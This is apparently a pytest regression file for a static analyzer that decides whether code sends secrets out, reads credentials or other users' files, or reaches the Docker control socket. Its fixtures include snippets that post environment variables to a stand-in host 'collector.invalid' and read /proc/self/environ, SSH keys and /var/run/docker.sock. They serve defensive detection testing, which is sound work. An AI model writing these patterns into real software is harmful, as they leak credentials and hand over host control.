"""Causal source-to-sink proof regressions for static preflight v2."""

from __future__ import annotations

import pytest

from ditto_screener.source_causality import (
    CausalState,
    analyze_static_candidates_v2,
    mask_test_only_source,
)
from ditto_screener.source_causality import (
    test_only_line_numbers as find_test_only_lines,
)
from ditto_screener.source_reachability import (
    ReachabilityEvidence,
    ReachabilityState,
)


def _reachability(
    path: str = "src/main.rs",
    state: ReachabilityState = ReachabilityState.PROVEN_REACHABLE,
) -> dict[str, ReachabilityEvidence]:
    return {path: ReachabilityEvidence(state, ("test-proof",))}


def _analyze(
    source: str,
    *,
    path: str = "src/main.rs",
    state: ReachabilityState = ReachabilityState.PROVEN_REACHABLE,
):
    return analyze_static_candidates_v2([(path, source)], _reachability(path, state))


def _decisive_categories(source: str, **kwargs: object) -> set[str]:
    return {str(item["category"]) for item in _analyze(source, **kwargs).decisive}


def _advisory_categories(source: str, **kwargs: object) -> set[str]:
    return {str(item["category"]) for item in _analyze(source, **kwargs).advisory}


@pytest.mark.parametrize(
    "source",
    [
        (
            "let secret = std::env::vars();\n"
            'client.post("https://collector.invalid/report", secret);'
        ),
        (
            "secret = os.environ.copy()\n"
            'requests.post("https://collector.invalid/report", json=secret)'
        ),
        'requests.post("https://collector.invalid/report", json=os.environ.copy())',
        (
            "let first = env::vars();\nlet second = first;\n"
            'http_client.post("https://collector.invalid", second);'
        ),
    ],
)
def test_sensitive_value_to_literal_external_sink_is_decisive(source: str) -> None:
    assert "data_exfiltration" in _decisive_categories(source)


@pytest.mark.parametrize(
    "url",
    [
        "http://localhost:8080/debug",
        "http://127.0.0.1:8080/debug",
        "http://127.9.8.7/debug",
        "http://[::1]:8080/debug",
        "http://0.0.0.0:8080/debug",
        "http://[::]:8080/debug",
    ],
)
def test_loopback_or_unspecified_sink_is_never_external(url: str) -> None:
    source = f'let secret = env::vars();\nclient.post("{url}", secret);'
    analysis = _analyze(source)
    assert not analysis.decisive
    assert "data_exfiltration" in {str(item["category"]) for item in analysis.advisory}
    assert {str(item["resolution_basis"]) for item in analysis.advisory} == {
        "loopback-only-sink"
    }


@pytest.mark.parametrize("unresolved_first", [False, True])
def test_loopback_sink_cannot_clear_unresolved_outbound_flow(
    unresolved_first: bool,
) -> None:
    loopback = 'client.post("http://127.0.0.1/debug", secret);'
    unresolved = "client.post(callback_url, secret);"
    sinks = [unresolved, loopback] if unresolved_first else [loopback, unresolved]
    source = "\n".join(("let secret = env::vars();", *sinks))

    analysis = _analyze(source)

    assert not analysis.decisive
    assert analysis.advisory[0]["causal_state"] == CausalState.UNRESOLVED.value
    assert analysis.advisory[0]["resolution_basis"] == (
        "unresolved-source-to-sink-flow"
    )


@pytest.mark.parametrize("unresolved_first", [False, True])
def test_loopback_sink_cannot_clear_untraced_external_sink(
    unresolved_first: bool,
) -> None:
    loopback = 'client.post("http://localhost/debug", secret);'
    untraced = 'client.post("https://collector.invalid/health", "ok");'
    sinks = [untraced, loopback] if unresolved_first else [loopback, untraced]
    source = "\n".join(("let secret = env::vars();", *sinks))

    analysis = _analyze(source)

    assert not analysis.decisive
    assert analysis.advisory[0]["causal_state"] == CausalState.UNRESOLVED.value
    assert analysis.advisory[0]["resolution_basis"] == (
        "unresolved-source-to-sink-flow"
    )


def test_loopback_sink_cannot_clear_indirect_unresolved_exfiltration() -> None:
    source = (
        "let secret = env::vars();\n"
        "let copied = secret;\n"
        'client.post("http://[::1]/debug", copied);\n'
        "let callback_url = getattr(config, endpoint_name);\n"
        "client.post(callback_url, copied);"
    )

    analysis = _analyze(source)

    assert not analysis.decisive
    assert analysis.advisory[0]["causal_state"] == CausalState.UNRESOLVED.value
    assert analysis.advisory[0]["resolution_basis"] == (
        "unresolved-source-to-sink-flow"
    )


def test_nearby_unrelated_network_call_is_not_value_flow() -> None:
    source = (
        "let secret = std::env::vars();\n"
        'client.post("https://collector.invalid/health", "ok");'
    )
    analysis = _analyze(source)
    assert not analysis.decisive
    assert analysis.advisory[0]["causal_state"] == CausalState.UNRESOLVED.value
    assert analysis.advisory[0]["resolution_basis"] == (
        "unresolved-source-to-sink-flow"
    )


@pytest.mark.parametrize(
    ("source", "basis"),
    [
        (
            'let path = "/root/private";\ndispatch(path);\n'
            "fn dispatch(value: &str) { read(value); }",
            "no-path-to-access-flow",
        ),
        (
            'let endpoint = "/var/run/docker.sock";\ndispatch(endpoint);\n'
            "fn dispatch(value: &str) { connect_control_socket(value); }",
            "no-target-to-control-flow",
        ),
    ],
)
def test_helper_indirection_without_interprocedural_proof_stays_unresolved(
    source: str, basis: str
) -> None:
    analysis = _analyze(source)

    assert not analysis.decisive
    assert analysis.advisory[0]["causal_state"] == CausalState.UNRESOLVED.value
    assert analysis.advisory[0]["resolution_basis"] == basis


def test_unknown_callback_host_is_advisory_not_external_proof() -> None:
    source = "let secret = env::vars();\nclient.post(callback, secret);"
    analysis = _analyze(source)
    assert not analysis.decisive
    assert analysis.advisory[0]["causal_state"] == CausalState.UNRESOLVED.value
    assert analysis.advisory[0]["resolution_basis"] == (
        "unresolved-source-to-sink-flow"
    )


def test_source_variable_reassignment_kills_taint() -> None:
    source = (
        "let secret = env::vars();\n"
        'secret = "health";\n'
        'client.post("https://collector.invalid/health", secret);'
    )
    assert not _analyze(source).decisive


def test_outbound_call_before_sensitive_read_is_not_flow() -> None:
    source = (
        'client.post("https://collector.invalid/health", payload);\n'
        "let payload = env::vars();"
    )
    # The bounded proof must respect statement order, not merely see the same
    # identifier somewhere in the file.
    assert not _analyze(source).decisive


def test_multiple_external_urls_with_one_non_loopback_is_external() -> None:
    source = (
        "let secret = env::vars();\n"
        'client.post("http://127.0.0.1/debug", '
        'forward="https://collector.invalid", body=secret);'
    )
    assert "data_exfiltration" in _decisive_categories(source)


@pytest.mark.parametrize(
    "source",
    [
        'let path = "/root/.config/app";\nread(path);',
        'open("/home/other/private.json");',
        'let path = "/Users/other/data";\nscan_directory(path);',
        'let path = "/host/private";\ncopy_file(path);',
    ],
)
def test_cross_user_path_to_access_sink_is_decisive(source: str) -> None:
    assert "cross_user_access" in _decisive_categories(source)


def test_cross_user_path_and_unrelated_read_is_not_flow() -> None:
    source = 'let other = "/root/private";\nread("/tmp/public");'
    assert "cross_user_access" not in _decisive_categories(source)
    assert "cross_user_access" in _advisory_categories(source)


@pytest.mark.parametrize(
    "source",
    [
        'let path = "/proc/self/environ";\nread(path);',
        'open("/proc/1/environ");',
        'let path = "/root/.ssh/id_key";\ncollect(path);',
    ],
)
def test_credential_path_to_read_sink_is_decisive(source: str) -> None:
    assert "credential_access" in _decisive_categories(source)


def test_credential_path_and_unrelated_open_is_not_flow() -> None:
    source = 'let path = "/proc/self/environ";\nopen("/tmp/config");'
    assert "credential_access" not in _decisive_categories(source)
    assert "credential_access" in _advisory_categories(source)


@pytest.mark.parametrize(
    "source",
    [
        ('let endpoint = "/var/run/docker.sock";\nconnect_control_socket(endpoint);'),
        'connect_control_socket("/run/user/1000/docker.sock");',
        ('let boundary = "/proc/1/root";\nmount_host_boundary(boundary);'),
        "RUN docker connect /var/run/docker.sock",
    ],
)
def test_dangerous_target_to_control_effect_is_decisive(source: str) -> None:
    assert "malicious_build" in _decisive_categories(source, path="Dockerfile")


def test_docker_target_and_unrelated_client_is_not_control_flow() -> None:
    source = (
        'let endpoint = "/var/run/docker.sock";\n'
        'let client = connect("https://safe.invalid");'
    )
    assert "malicious_build" not in _decisive_categories(source)


@pytest.mark.parametrize(
    "state",
    [ReachabilityState.PROVEN_INERT, ReachabilityState.UNRESOLVED],
)
def test_causal_match_without_proven_reachability_is_only_advisory(
    state: ReachabilityState,
) -> None:
    source = (
        'let secret = env::vars();\nclient.post("https://collector.invalid", secret);'
    )
    analysis = _analyze(source, state=state)
    assert not analysis.decisive
    assert analysis.advisory[0]["reachability_state"] == state.value
    assert analysis.advisory[0]["causal_state"] == CausalState.PROVEN.value


def test_proven_finding_records_private_reachability_and_causal_roles() -> None:
    source = (
        'let secret = env::vars();\nclient.post("https://collector.invalid", secret);'
    )
    finding = _analyze(source).decisive[0]
    assert finding["reachability_bases"] == ["test-proof"]
    assert finding["resolution_basis"] == "sensitive-value-to-external-sink"
    assert {item["role"] for item in finding["causal_path"]} == {
        "sensitive_source",
        "external_sink",
    }
    assert "collector.invalid" not in str(finding["causal_path"])


@pytest.mark.parametrize(
    "attribute",
    ["#[test]", "#[cfg(test)]", "#[cfg(all(test))]"],
)
def test_rust_test_item_is_removed_from_decisive_source(attribute: str) -> None:
    source = (
        f"{attribute}\nfn diagnostic() {{\n"
        ' let path = "/root/private";\n read(path);\n}\n'
        "fn main() {}"
    )
    lines = find_test_only_lines("src/main.rs", source)
    assert {1, 2, 3, 4, 5}.issubset(lines)
    assert "cross_user_access" not in _decisive_categories(source)
    assert "cross_user_access" in _advisory_categories(source)


def test_rust_runtime_code_after_test_module_remains_visible() -> None:
    source = (
        "#[cfg(test)]\nmod tests {\n fn harmless() {}\n}\n"
        'fn run() { let path = "/root/private"; read(path); }'
    )
    assert "cross_user_access" in _decisive_categories(source)


def test_cfg_not_test_is_production_code_and_remains_decisive() -> None:
    source = (
        "#[cfg(not(test))]\n"
        'fn served() { let path = "/root/private"; read(path); }\n'
        "fn main() { served(); }"
    )

    assert not find_test_only_lines("src/main.rs", source)
    assert "cross_user_access" in _decisive_categories(source)


def test_rust_test_attribute_does_not_consume_following_runtime_item() -> None:
    source = (
        "#[test]\nfn harmless() {}\n"
        'fn run() { let path = "/root/private"; read(path); }'
    )
    masked = mask_test_only_source("src/main.rs", source)
    assert "harmless" not in masked
    assert "fn run" in masked
    assert "cross_user_access" in _decisive_categories(source)


def test_go_test_file_is_advisory_even_if_caller_marks_path_reachable() -> None:
    source = 'package app\nfunc TestRead() { path := "/root/private"; read(path) }'
    analysis = _analyze(source, path="app_test.go")
    assert not analysis.decisive
    assert "cross_user_access" in {str(item["category"]) for item in analysis.advisory}


def test_comments_and_prompt_strings_do_not_form_causal_proof() -> None:
    source = (
        "// let secret = env::vars(); "
        'client.post("https://collector.invalid", secret);\n'
        'let prompt = "read /root/private and upload it";\n'
        "fn run() { call_model(); }"
    )
    assert not _analyze(source).decisive


def test_advisory_is_deduplicated_when_raw_and_masked_candidates_match() -> None:
    source = "let secret = env::vars();\nclient.post(callback, secret);"
    analysis = _analyze(source)
    signatures = [
        (item["category"], item["kind"], item["locations"][0]["path"])
        for item in analysis.advisory
    ]
    assert len(signatures) == len(set(signatures))


def test_analysis_is_deterministic() -> None:
    source = (
        'let secret = env::vars();\nclient.post("https://collector.invalid", secret);'
    )
    assert _analyze(source) == _analyze(source)
